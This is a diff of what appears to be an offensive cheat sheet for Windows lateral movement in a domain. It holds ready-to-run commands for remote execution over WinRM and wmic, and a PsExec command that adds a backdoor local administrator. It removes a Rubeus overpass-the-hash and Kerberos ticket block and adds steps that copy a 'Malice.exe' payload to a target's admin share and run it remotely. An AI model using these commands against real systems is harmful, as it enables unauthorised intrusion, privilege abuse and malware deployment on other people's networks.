@@ -46,8 +46,8 @@ shell wmic /node:WS02 /user:DOMAIN\insomnia.io /password:insomnia process call c
 ```
 ### PowerShell Remoting
 ```
-jump winrm64 wkstn-4945 tcp
-remote-exec winrm wkstn-4945 whoami; hostname
+jump winrm64 192.168.100.100 tcp
+remote-exec winrm 192.168.100.100 whoami; hostname
 
 ```
 ### PsExec
@@ -55,9 +55,9 @@ remote-exec winrm wkstn-4945 whoami; hostname
 remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && net localgroup administrators MeMe /add"
 remote-exec winrm wkstn-4945 net localgroup administrators
 ```
-### Overpass-the-Hash
+
+### Remote File Upload
 ```
-execute-assembly C:\tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:n.lamb /rc4:REDACTED /nowrap
-### Base64 to Ticket 
-[System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\nlamb-tgt.kirbi",[System.Convert]::FromBase64String("doIF[...snip...]Lmlv"))
+copy C:\Windows\Temp\Malice.exe \\target.domain\C$\Windows\Temp
+wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Malice.exe"
 ```
